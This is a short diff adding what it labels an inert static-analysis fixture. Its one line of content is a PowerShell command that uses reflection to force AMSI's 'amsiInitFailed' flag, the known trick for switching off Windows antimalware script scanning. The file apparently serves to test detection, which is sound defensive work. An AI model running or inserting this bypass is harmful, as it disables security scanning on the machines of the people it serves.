@@ -1,0 +1,2 @@
+INERT STATIC ANALYSIS FIXTURE; DO NOT EXECUTE.
+$field = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static"); $field.SetValue($null,$true)
